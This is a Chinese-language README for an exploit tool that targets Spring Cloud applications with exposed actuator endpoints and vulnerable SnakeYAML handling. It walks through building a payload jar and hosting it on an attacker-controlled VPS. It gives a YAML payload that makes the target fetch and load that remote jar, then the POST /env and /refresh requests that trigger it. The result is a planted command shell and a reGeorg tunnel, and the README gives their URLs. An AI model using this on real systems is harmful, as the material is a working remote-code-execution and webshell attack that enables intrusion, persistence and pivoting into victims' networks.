# README
Spring Cloud SnakeYAML 一键注册cmd shell和reGeorg

利用条件：
- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标依赖的 `spring-cloud-starter` 版本 < 1.3.0.RELEASE
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

仅在JDK1.8及Spring1.x测试通过,其他版本自测.

利用方法如下：
## 编译class文件然后打jar包
```bash
cd yaml-payload
javac src/artsploit/AwesomeScriptEngineFactory.java -cp ./lib
javac src/artsploit/Tunnel.java -cp ./lib
javac src/artsploit/GameInfo.java -cp ./lib
jar -cvf yaml-payload.jar -C src/ .
```

## 托管 yml 和 jar 文件
在自己控制的`vps`机器上开启一个简单`HTTP`服务器，端口尽量使用常见`HTTP`服务端口（80、443）

```bash
# 使用 python 快速开启 http server
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在网站根目录下放置后缀为`yml`的文件`yaml-payload.yml`,内容如下:
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/yaml-payload.jar"]
  ]]
]
```

在网站根目录下放置打包好的`yaml-payload.jar`

## 设置`spring.cloud.bootstrap.location`属性

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/yaml-payload.yml
```

## 刷新配置

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

## 访问注入的shell
1. reGeorg: http://localhost:9092/api/v1/tunnel
2. cmd shell: http://localhost:9092/api/v1/game POST:code=whoami